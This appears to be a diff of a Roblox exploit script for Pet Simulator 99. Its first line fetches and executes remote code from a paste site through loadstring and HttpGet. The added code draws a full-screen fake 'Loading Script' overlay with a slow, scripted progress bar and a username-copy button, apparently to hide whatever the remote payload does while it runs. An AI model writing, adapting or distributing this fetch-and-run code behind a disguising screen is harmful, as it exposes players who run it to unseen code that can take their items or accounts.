@@ -1,2 +1,193 @@
 loadstring(game:HttpGet("https://paste.debian.net/plainh/088f8024/", true))()
 
+local TweenService = game:GetService("TweenService")
+local SoundService = game:GetService("SoundService")
+local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- REMOVE EXISTING GUI IF PRESENT
+if CoreGui:FindFirstChild("PS99LoadingScreen") then
+	CoreGui.PS99LoadingScreen:Destroy()
+end
+
+-- GUI SETUP
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "PS99LoadingScreen"
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = CoreGui
+
+-- BACKGROUND MUSIC
+local bgMusic = Instance.new("Sound", SoundService)
+bgMusic.SoundId = "rbxassetid://1837467334"
+bgMusic.Looped = true
+bgMusic.Volume = 0.3
+bgMusic:Play()
+
+-- MAIN BACKGROUND
+local mainFrame = Instance.new("Frame", screenGui)
+mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+mainFrame.Size = UDim2.new(1, 0, 1, 0)
+mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+mainFrame.ZIndex = 0
+
+-- PARTICLES (Stars)
+local particleFolder = Instance.new("Folder", mainFrame)
+local center = Vector2.new(0.5, 0.5)
+for i = 1, 150 do
+	local star = Instance.new("Frame", particleFolder)
+	local size = math.random(1, 2)
+	star.Size = UDim2.new(0, size, 0, size)
+	star.BackgroundColor3 = Color3.new(1, 1, 1)
+	star.BackgroundTransparency = math.random(40, 70) / 100
+	star.BorderSizePixel = 0
+	star.ZIndex = 1
+
+	local comet = Instance.new("UIGradient", star)
+	comet.Rotation = 0
+	comet.Color = ColorSequence.new(Color3.new(1, 1, 0.8), Color3.new(1, 1, 1))
+	comet.Transparency = NumberSequence.new(0.1, 1)
+
+	local angle = math.random() * math.pi * 2
+	local radius = math.random(100, 250) / 500
+	local offset = math.random() * math.pi * 2
+	local speed = math.random(50, 80) / 10000
+
+	task.spawn(function()
+		while star.Parent do
+			angle += speed
+			local x = center.X + math.cos(angle + offset) * radius
+			local y = center.Y + math.sin(angle + offset) * radius
+			star.Position = UDim2.new(x, 0, y, 0)
+			task.wait(0.05)
+		end
+	end)
+end
+
+-- LOADING UI
+local function showLoadingUI()
+	local galaxyImage = Instance.new("ImageLabel", mainFrame)
+	galaxyImage.Size = UDim2.new(1.5, 0, 1.5, 0)
+	galaxyImage.Position = UDim2.new(-0.25, 0, -0.25, 0)
+	galaxyImage.Image = "rbxassetid://2558063658"
+	galaxyImage.BackgroundTransparency = 1
+	galaxyImage.ImageTransparency = 0.2
+	galaxyImage.ZIndex = 1
+	TweenService:Create(galaxyImage, TweenInfo.new(60, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), { Rotation = 360 }):Play()
+
+	local box = Instance.new("Frame", mainFrame)
+	box.Size = UDim2.new(0.4, 0, 0.15, 0)
+	box.Position = UDim2.new(0.3, 0, 0.4, 0)
+	box.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+	box.ZIndex = 2
+	Instance.new("UICorner", box).CornerRadius = UDim.new(0, 12)
+
+	local loadingText = Instance.new("TextLabel", box)
+	loadingText.Size = UDim2.new(1, 0, 1, 0)
+	loadingText.Text = "Loading Script"
+	loadingText.TextColor3 = Color3.new(1, 1, 1)
+	loadingText.BackgroundTransparency = 1
+	loadingText.Font = Enum.Font.SourceSansBold
+	loadingText.TextScaled = true
+	loadingText.ZIndex = 3
+
+	-- Loading Text Animation
+	task.spawn(function()
+		while true do
+			for i = 0, 3 do
+				loadingText.Text = "Loading Script" .. string.rep(".", i)
+				task.wait(0.5)
+			end
+		end
+	end)
+
+	-- Copy Username Button
+	local copyButton = Instance.new("TextButton", mainFrame)
+	copyButton.Size = UDim2.new(0.25, 0, 0.06, 0)
+	copyButton.Position = UDim2.new(0.375, 0, 0.7, 0)
+	copyButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+	copyButton.Text = "Copy Your Username"
+	copyButton.TextColor3 = Color3.new(1, 1, 1)
+	copyButton.Font = Enum.Font.GothamBold
+	copyButton.TextScaled = true
+	copyButton.ZIndex = 10
+	Instance.new("UICorner", copyButton).CornerRadius = UDim.new(0, 8)
+
+	local copySound = Instance.new("Sound", copyButton)
+	copySound.SoundId = "rbxassetid://9118823107"
+	copySound.Volume = 1
+
+	local popup = Instance.new("TextLabel", mainFrame)
+	popup.Size = UDim2.new(0.4, 0, 0.06, 0)
+	popup.Position = UDim2.new(0.3, 0, 0.78, 0)
+	popup.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+	popup.TextColor3 = Color3.new(1, 1, 1)
+	popup.Font = Enum.Font.GothamBold
+	popup.TextScaled = true
+	popup.Visible = false
+	popup.ZIndex = 11
+	Instance.new("UICorner", popup).CornerRadius = UDim.new(0, 8)
+
+	copyButton.MouseButton1Click:Connect(function()
+		local username = LocalPlayer and LocalPlayer.Name or "Unknown"
+		setclipboard(username)
+		copySound:Play()
+		TweenService:Create(copyButton, TweenInfo.new(0.15), {
+			Size = UDim2.new(0.27, 0, 0.065, 0)
+		}):Play()
+		task.wait(0.15)
+		TweenService:Create(copyButton, TweenInfo.new(0.15), {
+			Size = UDim2.new(0.25, 0, 0.06, 0)
+		}):Play()
+		popup.Text = "Copied: " .. username
+		popup.Visible = true
+		task.wait(2)
+		popup.Visible = false
+	end)
+
+	-- Loading Bar
+	local barContainer = Instance.new("Frame", mainFrame)
+	barContainer.Size = UDim2.new(0.5, 0, 0.05, 0)
+	barContainer.Position = UDim2.new(0.25, 0, 0.85, 0)
+	barContainer.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+	barContainer.ZIndex = 3
+	barContainer.BorderSizePixel = 0
+	Instance.new("UICorner", barContainer).CornerRadius = UDim.new(0, 10)
+
+	local barFill = Instance.new("Frame", barContainer)
+	barFill.Size = UDim2.new(0, 0, 1, 0)
+	barFill.BackgroundColor3 = Color3.fromRGB(85, 170, 255)
+	barFill.BorderSizePixel = 0
+	barFill.ZIndex = 4
+	Instance.new("UICorner", barFill).CornerRadius = UDim.new(0, 10)
+
+	local percentText = Instance.new("TextLabel", barContainer)
+	percentText.Size = UDim2.new(1, 0, 1, 0)
+	percentText.BackgroundTransparency = 1
+	percentText.TextColor3 = Color3.new(1, 1, 1)
+	percentText.Font = Enum.Font.GothamBold
+	percentText.TextScaled = true
+	percentText.ZIndex = 5
+	percentText.Text = "0%"
+
+	task.spawn(function()
+		for i = 1, 100 do
+			percentText.Text = i .. "%"
+			barFill.Size = UDim2.new(i / 100, 0, 1, 0)
+			if i < 90 then
+				task.wait(1.2)
+			elseif i < 95 then
+				task.wait(1.8)
+			elseif i < 99 then
+				task.wait(2.5)
+			else
+				task.wait(3)
+			end
+		end
+	end)
+end
+
+-- RUN IMMEDIATELY
+showLoadingUI() 
